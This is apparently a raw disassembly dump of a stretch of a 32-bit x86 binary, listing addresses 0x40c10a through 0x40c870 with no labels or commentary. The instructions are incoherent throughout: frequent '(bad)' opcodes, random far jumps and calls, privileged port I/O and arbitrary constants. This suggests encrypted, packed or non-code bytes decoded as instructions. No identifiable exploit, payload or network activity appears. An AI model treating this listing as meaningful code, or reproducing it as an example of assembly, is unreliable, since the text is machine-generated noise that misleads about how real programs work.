  40c10a:	test   DWORD PTR [eax-0x1b],eax
  40c10d:	fisubr DWORD PTR [edx+ebp*8-0x29a02cdf]
  40c114:	fnstenv [ecx-0x2a6a9256]
  40c11a:	inc    esp
  40c11b:	sti    
  40c11c:	mov    ebx,DWORD PTR [esi-0x34]
  40c11f:	xchg   esi,eax
  40c120:	pop    eax
  40c121:	(bad)  
  40c122:	cmp    DWORD PTR [ebp-0x36eb34b8],edx
  40c128:	inc    eax
  40c129:	out    0xc1,al
  40c12b:	loop   0x40c16c
  40c12d:	jns    0x40c0df
  40c12f:	mov    esp,0xfa6cc8a8
  40c134:	fdivr  QWORD PTR [edx]
  40c136:	dec    edi
  40c137:	fsubp  st(6),st
  40c139:	mov    ecx,0x9e662df2
  40c13e:	mov    ebp,0x23ae3c4c
  40c143:	adc    BYTE PTR [ecx-0x2a6a5253],bl
  40c149:	cmp    bl,BYTE PTR ds:0x9af1752b
  40c14f:	adc    esi,DWORD PTR [esi+0x37]
  40c152:	dec    esp
  40c153:	push   0xd085f7d
  40c158:	sub    BYTE PTR [eax],bh
  40c15a:	push   0xfffffff2
  40c15c:	mov    eax,0x9851be16
  40c161:	js     0x40c143
  40c163:	push   eax
  40c164:	test   DWORD PTR [edx],edx
  40c166:	stos   BYTE PTR es:[edi],al
  40c167:	shl    edi,cl
  40c169:	push   0xffffff98
  40c16b:	gs sar bl,cl
  40c16e:	jnp    0x40c115
  40c170:	aam    0x3b
  40c172:	jo     0x40c159
  40c174:	aaa    
  40c175:	(bad)
  40c17a:	pop    esp
  40c17b:	xchg   esp,eax
  40c17c:	jmp    0x20d5:0xa14ed635
  40c183:	in     eax,0xa9
  40c185:	mov    edi,esi
  40c187:	pop    ds
  40c188:	inc    ebx
  40c189:	lea    ebx,[edx-0x75]
  40c18c:	out    0xa8,al
  40c18e:	cmp    ecx,esp
  40c190:	xchg   edi,eax
  40c191:	inc    edi
  40c192:	stos   BYTE PTR es:[edi],al
  40c193:	jmp    0x40c1e3
  40c195:	pop    eax
  40c196:	sbb    ebx,DWORD PTR [edx-0x68be8389]
  40c19c:	push   esp
  40c19d:	adc    BYTE PTR es:[ebx+0x5882068b],ch
  40c1a4:	ss (bad) 
  40c1a6:	(bad)  
  40c1a7:	sub    al,ah
  40c1a9:	push   esp
  40c1aa:	das    
  40c1ab:	repz mov al,ds:0x58802bc3
  40c1b1:	push   edi
  40c1b2:	and    eax,0x9e14d112
  40c1b7:	add    DWORD PTR [esi-0xb7d57b2],ecx
  40c1bd:	pusha  
  40c1be:	add    DWORD PTR [edi-0xa],esi
  40c1c1:	and    al,0x7d
  40c1c3:	int3   
  40c1c4:	dec    edx
  40c1c5:	retf   0xd29b
  40c1c8:	inc    edi
  40c1c9:	xor    dl,ch
  40c1cb:	push   0x792b9834
  40c1d0:	cmp    ecx,DWORD PTR ds:0x8bf77211
  40c1d6:	call   0x9677:0xec48e828
  40c1dd:	cmp    eax,0x41c04c0b
  40c1e2:	icebp  
  40c1e3:	shl    esp,0x85
  40c1e6:	pop    ebx
  40c1e7:	aas    
  40c1e8:	ja     0x40c25a
  40c1ea:	bound  ecx,QWORD PTR [ecx+0x251a81cd]
  40c1f0:	jnp    0x40c257
  40c1f2:	xchg   BYTE PTR [esi+0x144a12d8],dh
  40c1f8:	outs   dx,BYTE PTR ds:[esi]
  40c1f9:	mov    ecx,0xda0b8c5e
  40c1fe:	dec    edx
  40c1ff:	jns    0x40c1be
  40c201:	push   ds
  40c202:	sbb    eax,edi
  40c204:	xchg   edx,eax
  40c205:	xchg   ecx,eax
  40c206:	loopne 0x40c1c2
  40c208:	mov    bh,0xb6
  40c20a:	mov    esp,DWORD PTR [ecx-0x38]
  40c20d:	and    al,0x85
  40c20f:	fist   WORD PTR [ebp+0x5d]
  40c212:	iret   
  40c213:	out    0x29,al
  40c215:	ret    0xd196
  40c218:	jno    0x40c24f
  40c21a:	adc    ebx,DWORD PTR ss:[ebp-0x114e361]
  40c221:	(bad)  
  40c223:	xlat   BYTE PTR ds:[ebx]
  40c224:	pmaddwd mm3,QWORD PTR [ecx+0x29]
  40c228:	jnp    0x40c220
  40c22a:	ss pop ds
  40c22c:	sub    DWORD PTR [ecx+edx*4],0xc9e2f083
  40c233:	in     al,dx
  40c234:	mov    esi,0x849e6bf9
  40c239:	mov    bh,0xbd
  40c23b:	fs pop ds
  40c23d:	cld    
  40c23e:	rcl    BYTE PTR [edx-0x74],cl
  40c241:	xchg   ecx,eax
  40c242:	dec    eax
  40c243:	sar    BYTE PTR [ebp+0x70e8d028],0xf9
  40c24a:	into   
  40c24b:	xor    edx,DWORD PTR fs:[eax-0xe3dc0be]
  40c252:	xchg   ebp,eax
  40c253:	dec    esp
  40c254:	sar    DWORD PTR [esi],1
  40c256:	ror    BYTE PTR [edi+0x53],cl
  40c259:	cmp    dl,al
  40c25b:	fnstcw WORD PTR gs:[esi]
  40c25e:	(bad)  
  40c25f:	xor    bh,bh
  40c261:	and    eax,0x9cecbc6d
  40c266:	pop    es
  40c267:	pushf  
  40c268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c269:	aad    0x7
  40c26b:	jmp    0x59f4fb48
  40c270:	mov    BYTE PTR [ecx-0x6e155756],ch
  40c276:	daa    
  40c277:	jmp    0x40c2c9
  40c279:	ins    DWORD PTR es:[edi],dx
  40c27a:	mov    esi,DWORD PTR [esi+0x4dbdd25b]
  40c280:	cld    
  40c281:	push   eax
  40c282:	xchg   ebx,eax
  40c283:	xor    eax,0xf6f52e2d
  40c288:	mov    ebx,0xd1872b5b
  40c28d:	je     0x40c21f
  40c28f:	cwde   
  40c290:	div    BYTE PTR [ebx]
  40c292:	xchg   ebx,eax
  40c293:	(bad)  
  40c294:	cmc    
  40c295:	fcomi  st,st(4)
  40c297:	ja     0x40c25e
  40c299:	in     al,0x29
  40c29b:	mov    bl,0x1a
  40c29d:	sbb    bh,BYTE PTR [esi]
  40c29f:	pop    ecx
  40c2a0:	stc    
  40c2a1:	jo     0x40c2dd
  40c2a3:	jb     0x40c266
  40c2a5:	mov    al,0x90
  40c2a7:	push   esp
  40c2a8:	pop    esi
  40c2a9:	push   0x3dc28d56
  40c2ae:	dec    ecx
  40c2af:	and    cl,al
  40c2b1:	xor    eax,0xc42f1bb
  40c2b6:	mov    ds:0x4f4427df,al
  40c2bb:	cld    
  40c2bc:	in     eax,0x68
  40c2be:	ins    BYTE PTR es:[edi],dx
  40c2bf:	lds    ecx,FWORD PTR [ebp+eiz*1+0x4fffa5aa]
  40c2c6:	jns    0x40c2e8
  40c2c8:	dec    ebx
  40c2c9:	inc    ebp
  40c2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2cb:	jmp    0x6608:0x33768847
  40c2d2:	fsubr  QWORD PTR [ebx-0x41]
  40c2d5:	add    al,0x88
  40c2d7:	sub    BYTE PTR [ebp+0x6c],dl
  40c2da:	repnz fwait
  40c2dc:	pop    esi
  40c2dd:	jge    0x40c2e9
  40c2df:	push   esp
  40c2e0:	mov    cl,BYTE PTR [edx-0x25e69580]
  40c2e6:	jge    0x40c31a
  40c2e8:	push   edx
  40c2e9:	xor    al,0xc8
  40c2eb:	mov    eax,ds:0xfc5bf951
  40c2f0:	(bad)  [ebx+0x6e858b26]
  40c2f6:	mov    ds:0x46a87303,eax
  40c2fb:	ss aad 0x72
  40c2fe:	test   BYTE PTR [ecx+eiz*8],al
  40c301:	sbb    DWORD PTR [edx+0x1a],edi
  40c304:	mov    edx,0x7ed2cd78
  40c309:	test   BYTE PTR [ecx-0x6c7e7083],al
  40c30f:	mov    cl,0x22
  40c311:	push   0x4860f623
  40c316:	mov    dl,0xfb
  40c318:	and    al,0xb2
  40c31a:	jge    0x40c2c1
  40c31c:	jp     0x40c30f
  40c31e:	sub    esi,0x3aa397da
  40c324:	adc    edi,DWORD PTR [ecx+0x1d]
  40c327:	mov    ss,WORD PTR [esi+0x62045fd0]
  40c32d:	stc    
  40c32e:	adc    DWORD PTR [esi-0x76],ebp
  40c331:	mov    ebx,0x3af8c98e
  40c336:	adc    DWORD PTR [ebx],ebp
  40c338:	dec    edx
  40c339:	xchg   edx,eax
  40c33a:	and    DWORD PTR [edx-0xa9bad0c],ecx
  40c340:	xor    eax,0xcd00452f
  40c345:	aaa    
  40c346:	imul   ebp,ecx,0xffffff8f
  40c349:	ret    0xbd61
  40c34c:	jle    0x40c3b0
  40c34e:	sub    bl,BYTE PTR [eax]
  40c350:	aad    0x79
  40c352:	adc    al,0x38
  40c354:	in     al,dx
  40c355:	stc    
  40c356:	add    dl,ah
  40c358:	pop    eax
  40c359:	cli    
  40c35a:	dec    edx
  40c35b:	(bad)  
  40c35c:	jge    0x40c33b
  40c35e:	or     esp,DWORD PTR [esi-0x1f59048d]
  40c364:	ret    0x2e72
  40c367:	add    ebp,edi
  40c369:	dec    esp
  40c36a:	pop    esi
  40c36b:	lahf   
  40c36c:	xlat   BYTE PTR ds:[ebx]
  40c36d:	repnz fiadd DWORD PTR [eax+0x3e]
  40c371:	sbb    dh,BYTE PTR [ebp+0x4b]
  40c374:	sti    
  40c375:	(bad)  
  40c376:	imul   esp,DWORD PTR [ebx+ecx*4-0x5421958c],0x6b
  40c37e:	xchg   esp,eax
  40c37f:	mov    eax,ss
  40c381:	psadbw mm5,QWORD PTR [ecx]
  40c384:	dec    ebx
  40c385:	out    0xf3,eax
  40c387:	push   edi
  40c388:	imul   esp,ebx,0xd3e0c3a3
  40c38e:	mov    edx,DWORD PTR [ebp-0x5c]
  40c391:	xor    eax,edi
  40c393:	xor    edx,edx
  40c395:	or     eax,edx
  40c397:	mov    edx,DWORD PTR [ebp+0x14]
  40c39a:	shl    ecx,0x1e
  40c39d:	jmp    0x40c927
  40c3a2:	sbb    esp,edi
  40c3a4:	adc    eax,0x1913193b
  40c3a9:	aad    0x32
  40c3ab:	into   
  40c3ac:	sti    
  40c3ad:	mov    ah,0xff
  40c3af:	dec    eax
  40c3b0:	fs jb  0x40c3f7
  40c3b3:	ficom  WORD PTR [esi]
  40c3b5:	push   ss
  40c3b6:	cmp    eax,0xb2161604
  40c3bb:	push   ss
  40c3bc:	lods   al,BYTE PTR ds:[esi]
  40c3bd:	out    0x5c,al
  40c3bf:	mov    al,0x15
  40c3c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3c2:	loop   0x40c419
  40c3c4:	jbe    0x40c3cc
  40c3c6:	cs sub al,0x13
  40c3c9:	dec    edi
  40c3ca:	mov    edx,0x4d0b2cf0
  40c3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d1:	mov    fs,WORD PTR [edx]
  40c3d3:	pop    es
  40c3d4:	jle    0x40c3fd
  40c3d6:	loopne 0x40c399
  40c3d8:	ficomp DWORD PTR [eax+0x28dc34f9]
  40c3de:	aaa    
  40c3df:	xor    al,0x93
  40c3e1:	dec    ecx
  40c3e2:	jno    0x40c391
  40c3e4:	or     DWORD PTR [edi],edi
  40c3e6:	mov    bh,0x25
  40c3e8:	(bad)  
  40c3ea:	jae    0x40c3c4
  40c3ec:	dec    esp
  40c3ed:	lea    ebx,[edx+ebx*8-0x5]
  40c3f1:	mov    BYTE PTR [ecx-0x250cce9f],dl
  40c3f7:	mov    dl,0xf2
  40c3f9:	in     al,0x56
  40c3fb:	ins    BYTE PTR es:[edi],dx
  40c3fc:	xor    ebx,DWORD PTR [ecx+0x77]
  40c3ff:	add    cl,BYTE PTR [ebx+0x39]
  40c402:	xor    eax,0xaa6d60f1
  40c407:	cmp    ebp,DWORD PTR [ebp+ebx*2+0x5d]
  40c40b:	mov    bh,0xd9
  40c40d:	jl     0x40c3db
  40c40f:	icebp  
  40c410:	std    
  40c411:	mov    ecx,0xa2e6d9c2
  40c416:	stos   BYTE PTR es:[edi],al
  40c417:	js     0x40c3fa
  40c419:	mov    BYTE PTR [eax+0x41b1ef5c],ah
  40c41f:	xcrypt-ofb (bad)
  40c420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c421:	imul   edi,DWORD PTR [ebx+0x6e],0x158778ee
  40c428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c429:	outs   dx,BYTE PTR ds:[esi]
  40c42a:	dec    esp
  40c42b:	jecxz  0x40c435
  40c42d:	lahf   
  40c42e:	sub    al,0xb0
  40c430:	jns    0x40c446
  40c432:	mov    ds:0x3dfeb500,eax
  40c437:	push   esp
  40c438:	xchg   ecx,eax
  40c439:	pop    edx
  40c43a:	das    
  40c43b:	mov    edi,0x2ce902ec
  40c440:	xchg   ebp,eax
  40c441:	aas    
  40c442:	and    eax,0x4e876517
  40c447:	xor    bh,dh
  40c449:	test   BYTE PTR [ebx+0x79c29e70],al
  40c44f:	(bad)  
  40c451:	cmp    BYTE PTR [ecx+edx*1],al
  40c454:	jns    0x40c484
  40c456:	imul   edx,DWORD PTR [esi],0x55
  40c459:	fidiv  WORD PTR [edx]
  40c45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c45c:	inc    ebp
  40c45d:	mov    dh,0x9
  40c45f:	jbe    0x40c415
  40c461:	(bad)  
  40c462:	popa   
  40c463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c464:	push   edx
  40c465:	sbb    eax,DWORD PTR [edx+0x71b058da]
  40c46b:	ins    BYTE PTR es:[edi],dx
  40c46c:	mov    bh,0x56
  40c46e:	push   cs
  40c46f:	pop    edi
  40c470:	jge    0x40c42e
  40c472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c473:	dec    ebx
  40c474:	xchg   DWORD PTR [ecx],eax
  40c476:	out    0x3c,eax
  40c478:	xchg   esi,eax
  40c479:	ffree  st(6)
  40c47b:	xor    ecx,DWORD PTR [ebx-0x5315a152]
  40c481:	fist   WORD PTR [esp+esi*2-0x5fe71d27]
  40c488:	loope  0x40c41e
  40c48a:	jnp    0x40c473
  40c48c:	out    0x0,al
  40c48e:	xchg   ecx,eax
  40c48f:	or     eax,0x4894fb59
  40c494:	pop    es
  40c495:	push   cs
  40c496:	clc    
  40c497:	mov    eax,0xf72e9bbe
  40c49c:	cdq    
  40c49d:	hlt    
  40c49e:	ror    DWORD PTR [ebp+0x3c],1
  40c4a1:	push   ebx
  40c4a2:	mov    ebp,0x5d1b0bc9
  40c4a7:	or     eax,0x72a020bf
  40c4ac:	addr16 xchg edi,eax
  40c4ae:	jmp    FWORD PTR [edi]
  40c4b0:	aam    0x7b
  40c4b2:	add    al,0xc1
  40c4b4:	xor    cl,BYTE PTR [ebp+ecx*8+0x38]
  40c4b8:	jmp    0x40c4f7
  40c4ba:	fidiv  WORD PTR [ebp-0x1c]
  40c4bd:	xchg   ebx,eax
  40c4be:	and    eax,0x53a06e85
  40c4c3:	ins    BYTE PTR es:[edi],dx
  40c4c4:	pusha  
  40c4c5:	and    BYTE PTR [edi-0x54d6f07b],al
  40c4cb:	sub    DWORD PTR [edi+eiz*2],ebx
  40c4ce:	push   0x6dd95a0
  40c4d3:	xlat   BYTE PTR ds:[ebx]
  40c4d4:	add    al,0x45
  40c4d6:	add    dh,cl
  40c4d8:	out    0xfc,al
  40c4da:	scas   eax,DWORD PTR es:[edi]
  40c4db:	ins    BYTE PTR es:[edi],dx
  40c4dc:	inc    ecx
  40c4dd:	and    DWORD PTR [ecx],esi
  40c4df:	cld    
  40c4e0:	shr    dh,0x76
  40c4e3:	mov    ah,BYTE PTR [ebp-0x78]
  40c4e6:	sbb    dh,bl
  40c4e8:	and    eax,0xe879cb2
  40c4ed:	int    0x9a
  40c4ef:	push   esi
  40c4f0:	ds arpl sp,bp
  40c4f3:	out    dx,eax
  40c4f4:	add    eax,0x393c72cd
  40c4f9:	fsubr  DWORD PTR [edi]
  40c4fb:	std    
  40c4fc:	or     BYTE PTR ss:[ecx+0x27],al
  40c500:	test   al,0x91
  40c502:	fcmovb st,st(7)
  40c504:	push   ss
  40c505:	jo     0x40c534
  40c507:	or     ah,BYTE PTR [ebp+0x5e]
  40c50a:	pop    esp
  40c50b:	lds    esi,FWORD PTR [ebx-0x3c]
  40c50e:	jmp    0x5d39:0x4b885a5f
  40c515:	sbb    al,0x26
  40c517:	mov    al,0x31
  40c519:	fmul   st,st(7)
  40c51b:	aam    0x20
  40c51d:	sub    al,0xb1
  40c51f:	mov    ebp,DWORD PTR [edi]
  40c521:	dec    ebx
  40c522:	add    bl,al
  40c524:	inc    edx
  40c525:	ror    BYTE PTR [ebp-0x1af9df9],cl
  40c52b:	rcr    DWORD PTR [ebp+0x29dbe172],1
  40c531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c532:	cs push 0xe067ed31
  40c538:	xchg   esp,eax
  40c539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53a:	pusha  
  40c53b:	call   0xf0ce:0xf22aab10
  40c542:	adc    ch,dh
  40c544:	and    dh,cl
  40c546:	inc    esp
  40c547:	push   es
  40c548:	xchg   esi,eax
  40c549:	xchg   edi,eax
  40c54a:	xchg   BYTE PTR [edi],bh
  40c54c:	(bad)  
  40c54d:	mov    edx,0xfd195b97
  40c552:	and    DWORD PTR [ebx],esi
  40c554:	fwait
  40c555:	loop   0x40c4fc
  40c557:	mov    ss,WORD PTR [ebx-0x1e]
  40c55a:	cmc    
  40c55b:	pusha  
  40c55c:	mov    bh,0x2b
  40c55e:	xor    al,0xcb
  40c560:	pop    ebx
  40c561:	mov    edi,0xa4640875
  40c566:	cmp    eax,0x855df779
  40c56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c56c:	xor    eax,0x459420ba
  40c571:	rcl    DWORD PTR [ebx-0x25],cl
  40c574:	hlt    
  40c575:	jbe    0x40c56a
  40c577:	jge    0x40c5ee
  40c579:	out    0x2e,eax
  40c57b:	pop    edi
  40c57c:	or     DWORD PTR [ebx+0x21bc1f41],0xda022c57
  40c586:	lods   al,BYTE PTR ds:[esi]
  40c587:	push   DWORD PTR [ebp+0x4692afd5]
  40c58d:	and    cl,al
  40c58f:	sub    BYTE PTR [ebp-0x24],bh
  40c592:	cmp    al,0x31
  40c594:	int    0x3c
  40c596:	mov    esi,0xeba9da31
  40c59b:	pop    edx
  40c59c:	out    0xc6,al
  40c59e:	jmp    0x4672:0x45443f1
  40c5a5:	pusha  
  40c5a6:	pop    es
  40c5a7:	mov    eax,DWORD PTR [edx+0x4687f26a]
  40c5ad:	xor    DWORD PTR [edx+0x28],ebx
  40c5b0:	add    dl,BYTE PTR [ebp+edi*2+0x3453c510]
  40c5b7:	shr    dl,1
  40c5b9:	out    dx,eax
  40c5ba:	fsubr  DWORD PTR [ebp-0x59fe4252]
  40c5c0:	add    BYTE PTR [esi+0x6ac38653],0x36
  40c5c7:	pop    esp
  40c5c8:	pop    eax
  40c5c9:	mov    ch,0x19
  40c5cb:	addr16 leave 
  40c5cd:	das    
  40c5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5cf:	xor    DWORD PTR [eax],esi
  40c5d1:	and    edx,DWORD PTR [edx-0x32d11371]
  40c5d7:	aas    
  40c5d8:	(bad)  
  40c5d9:	(bad)  
  40c5db:	fimul  DWORD PTR [ecx]
  40c5dd:	adc    ah,ah
  40c5df:	into   
  40c5e0:	fadd   st(5),st
  40c5e2:	mov    al,0x2e
  40c5e4:	ins    BYTE PTR es:[edi],dx
  40c5e5:	sbb    ah,dl
  40c5e7:	push   eax
  40c5e8:	mov    esp,0x43f99634
  40c5ed:	pop    es
  40c5ee:	mov    cl,0xcf
  40c5f0:	cs cwde 
  40c5f2:	push   es
  40c5f3:	loop   0x40c651
  40c5f5:	cld    
  40c5f6:	add    esi,DWORD PTR ds:0xf2b90ddd
  40c5fc:	icebp  
  40c5fd:	mov    ecx,0xbdd9d5e3
  40c602:	aad    0x6d
  40c604:	into   
  40c605:	dec    esp
  40c606:	(bad)  
  40c607:	xchg   edx,eax
  40c608:	mov    ch,0x6f
  40c60a:	ins    DWORD PTR es:[edi],dx
  40c60b:	sub    BYTE PTR [esi-0x36],0xd0
  40c60f:	push   esi
  40c610:	xor    BYTE PTR [ecx-0x1e13f2d3],cl
  40c616:	sar    edi,cl
  40c618:	fnstenv gs:[edi+0x4d]
  40c61c:	out    0xe8,al
  40c61e:	aas    
  40c61f:	shl    bh,0x93
  40c622:	scas   eax,DWORD PTR es:[edi]
  40c623:	jmp    0x6d47:0x4f708143
  40c62a:	icebp  
  40c62b:	out    dx,eax
  40c62c:	jmp    0xb54022e5
  40c631:	scas   al,BYTE PTR es:[edi]
  40c632:	mov    dh,0x14
  40c634:	jno    0x40c66d
  40c636:	std    
  40c637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c638:	dec    edi
  40c639:	xor    eax,0x73a27b0b
  40c63e:	push   eax
  40c63f:	scas   al,BYTE PTR es:[edi]
  40c640:	xchg   ecx,edi
  40c642:	pop    esp
  40c643:	mov    ah,0x5a
  40c645:	add    ah,BYTE PTR [ecx]
  40c647:	cmc    
  40c648:	aad    0xc3
  40c64a:	and    BYTE PTR [eax+0x3e7a37a7],0xaa
  40c651:	ds pop edx
  40c653:	mov    ds:0x14bcb249,al
  40c658:	push   ds
  40c659:	neg    BYTE PTR [esp+edx*4+0x6c]
  40c65d:	cmp    al,0xfe
  40c65f:	retf   
  40c660:	test   al,0x1a
  40c662:	adc    eax,0x8c67fbfb
  40c667:	divps  xmm6,XMMWORD PTR [eax-0x50582be2]
  40c66e:	sbb    edx,esp
  40c670:	(bad)  
  40c671:	fwait
  40c672:	pop    ecx
  40c673:	mov    cl,0xd9
  40c675:	(bad)
  40c678:	daa    
  40c679:	cwde   
  40c67a:	into   
  40c67b:	jmp    0x5462c686
  40c680:	xchg   ebx,eax
  40c681:	jns    0x40c621
  40c683:	pusha  
  40c684:	cmc    
  40c685:	push   0x4ec7d347
  40c68a:	rcr    BYTE PTR [esi+0x45b3a9ee],0x9c
  40c691:	imul   esp,DWORD PTR [ecx+0x7cc70298],0x46
  40c698:	dec    edx
  40c699:	loop   0x40c6fd
  40c69b:	aas    
  40c69c:	pop    ecx
  40c69d:	inc    ebx
  40c69e:	aaa    
  40c69f:	out    dx,eax
  40c6a0:	pop    ds
  40c6a1:	lahf   
  40c6a2:	arpl   di,bx
  40c6a4:	and    bh,BYTE PTR [edi+eiz*1+0x1c]
  40c6a8:	cwde   
  40c6a9:	jo     0x40c658
  40c6ab:	pop    edx
  40c6ac:	loopne 0x40c6c8
  40c6ae:	cmp    eax,DWORD PTR [ebp+edx*1-0x7887876c]
  40c6b5:	imul   ebx
  40c6b7:	add    edx,esi
  40c6b9:	push   cs
  40c6ba:	pusha  
  40c6bb:	(bad)  
  40c6bc:	cli    
  40c6bd:	pusha  
  40c6be:	stc    
  40c6bf:	xchg   BYTE PTR [edi],bl
  40c6c1:	jl     0x40c6b0
  40c6c3:	enter  0x27c3,0xaf
  40c6c7:	lock ret 
  40c6c9:	(bad)  
  40c6ca:	cli    
  40c6cb:	stos   BYTE PTR es:[edi],al
  40c6cc:	ret    
  40c6cd:	dec    ebp
  40c6ce:	repnz lahf 
  40c6d0:	cs loop 0x40c732
  40c6d3:	mov    eax,ds:0xbef27bef
  40c6d8:	and    BYTE PTR [esi+0x19],ah
  40c6db:	mov    esp,DWORD PTR [esi-0x2b771d09]
  40c6e1:	int    0xf2
  40c6e3:	mov    ebx,0xf1af0ab8
  40c6e8:	mov    DWORD PTR [ebx*1+0x5cc81537],edi
  40c6ef:	dec    ecx
  40c6f0:	pop    esi
  40c6f1:	pop    es
  40c6f2:	jmp    0x40c6d4
  40c6f4:	add    ecx,ecx
  40c6f6:	and    dh,bh
  40c6f8:	push   edx
  40c6f9:	inc    ebx
  40c6fa:	jmp    0xe590:0x9386681d
  40c701:	cs mov ch,0x41
  40c704:	adc    edx,DWORD PTR [ebp+0x65]
  40c707:	lea    ebx,[edi-0x5e]
  40c70a:	cmc    
  40c70b:	scas   eax,DWORD PTR es:[edi]
  40c70c:	adc    dh,BYTE PTR [esi]
  40c70e:	jle    0x40c6ea
  40c710:	shl    BYTE PTR [ebx+0xff6a325],0x63
  40c717:	stos   BYTE PTR es:[edi],al
  40c718:	cmc    
  40c719:	add    eax,0xb6c3ada3
  40c71e:	lods   eax,DWORD PTR ds:[esi]
  40c71f:	(bad)  
  40c720:	ror    DWORD PTR [ebp+esi*4-0x6fbbeae1],cl
  40c727:	adc    eax,0xfd605c06
  40c72c:	mov    al,ds:0x753d81c1
  40c731:	mov    ah,0x25
  40c733:	aas    
  40c734:	dec    ecx
  40c735:	cli    
  40c736:	cmp    DWORD PTR [esi],esi
  40c738:	stos   BYTE PTR es:[edi],al
  40c739:	inc    edi
  40c73a:	arpl   WORD PTR [eax],si
  40c73c:	adc    bl,BYTE PTR [ebp-0x16fee077]
  40c742:	test   al,0xdd
  40c744:	or     BYTE PTR [esi-0x2],bh
  40c747:	int3   
  40c748:	call   0x7489:0x19cc17f9
  40c74f:	add    DWORD PTR gs:[edx+0x13a3858f],ecx
  40c756:	mov    ebp,0xdbe11651
  40c75b:	(bad)  
  40c75c:	push   ebp
  40c75d:	pop    esp
  40c75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c75f:	jns    0x40c772
  40c761:	lahf   
  40c762:	popf   
  40c763:	out    dx,al
  40c764:	call   DWORD PTR [eax-0x12]
  40c767:	ss aaa 
  40c769:	push   es
  40c76a:	jo     0x40c764
  40c76c:	push   ebx
  40c76d:	stc    
  40c76e:	ja     0x40c7df
  40c770:	pop    ecx
  40c771:	sub    DWORD PTR [edx],0x72
  40c774:	adc    BYTE PTR ds:0x8d555b72,bh
  40c77a:	jbe    0x40c769
  40c77c:	mov    ds:0xfc089cc3,al
  40c781:	push   ecx
  40c782:	test   eax,0xa4a2f61
  40c787:	pop    es
  40c788:	rcr    BYTE PTR [esi],cl
  40c78a:	mov    ch,0x16
  40c78c:	add    DWORD PTR [edx-0x74],edx
  40c78f:	pop    ss
  40c790:	pushf  
  40c791:	or     BYTE PTR [eax],0x37
  40c794:	add    BYTE PTR [esi+eiz*1+0x445643e6],dh
  40c79b:	dec    ebx
  40c79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c79d:	cmp    cl,BYTE PTR [eax-0x12883ef3]
  40c7a3:	and    eax,0xc662dbae
  40c7a8:	fsubr  DWORD PTR [eax+0x6]
  40c7ab:	jecxz  0x40c7a3
  40c7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ae:	loopne 0x40c75f
  40c7b0:	das    
  40c7b1:	loopne 0x40c779
  40c7b3:	mov    ds:0x379b5064,al
  40c7b8:	xchg   edx,eax
  40c7b9:	pop    ecx
  40c7ba:	loop   0x40c74a
  40c7bc:	jo     0x40c7dd
  40c7be:	int3   
  40c7bf:	fisub  DWORD PTR [edi-0x64]
  40c7c2:	fwait
  40c7c3:	cwde   
  40c7c4:	mov    WORD PTR [ecx+0x45b218c7],cs
  40c7ca:	sar    bh,1
  40c7cc:	cld    
  40c7cd:	rcl    BYTE PTR [ebx+0x27],cl
  40c7d0:	mov    eax,ds:0x1051566e
  40c7d5:	out    0xc,eax
  40c7d7:	test   BYTE PTR [eax+esi*4],ch
  40c7da:	sub    edx,0xffffff84
  40c7dd:	sbb    bh,al
  40c7df:	into   
  40c7e0:	sti    
  40c7e1:	in     eax,0xa1
  40c7e3:	add    edi,DWORD PTR [esi]
  40c7e5:	jnp    0x40c79f
  40c7e7:	xchg   ebx,eax
  40c7e8:	sub    al,0x5d
  40c7ea:	dec    ebp
  40c7eb:	(bad)  
  40c7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ed:	mov    al,0x17
  40c7ef:	jne    0x40c7cf
  40c7f1:	add    eax,0xa4d64a2b
  40c7f6:	mov    ah,0x3b
  40c7f8:	push   eax
  40c7f9:	and    eax,0xfc544269
  40c7fe:	sub    ecx,0x40
  40c801:	sbb    cl,BYTE PTR [edx]
  40c803:	inc    edi
  40c804:	shl    DWORD PTR [ecx-0xf],cl
  40c807:	test   BYTE PTR [eax+esi*1+0x3c],al
  40c80b:	dec    esi
  40c80c:	in     eax,dx
  40c80d:	mov    ebp,0xecbefb54
  40c812:	rol    DWORD PTR [eax],1
  40c814:	mov    eax,ds:0x9b197bce
  40c819:	sbb    dh,bh
  40c81b:	sub    BYTE PTR [ebp-0x5dad1c14],bh
  40c821:	mov    ebp,0x18b54503
  40c826:	fbld   TBYTE PTR [ebx]
  40c828:	loop   0x40c8a1
  40c82a:	nop
  40c82b:	mov    BYTE PTR [eax+0x6d],0x30
  40c82f:	or     eax,0xc74918cd
  40c834:	shr    dl,cl
  40c836:	fwait
  40c837:	rol    BYTE PTR [edx+esi*2-0x73f22011],cl
  40c83e:	push   ebx
  40c83f:	(bad)  
  40c840:	mov    ds:0x180861b4,al
  40c845:	or     BYTE PTR [esi-0x7],bh
  40c848:	push   ebp
  40c849:	mov    ah,0xc4
  40c84b:	mov    ebp,0x322a7b22
  40c850:	(bad)  
  40c852:	loop   0x40c7d5
  40c854:	sbb    eax,0xc9d41352
  40c859:	test   eax,0xe98517ee
  40c85e:	iret   
  40c85f:	pop    edx
  40c860:	in     al,0xc7
  40c862:	and    DWORD PTR [ebp-0x3b],ebp
  40c865:	stos   DWORD PTR es:[edi],eax
  40c866:	push   cs
  40c867:	sbb    cl,BYTE PTR [bp-0x2617]
  40c86c:	in     eax,dx
  40c86d:	pop    ebx
  40c86e:	das    
  40c86f:	cmc    
  40c870:	in     al,0x64
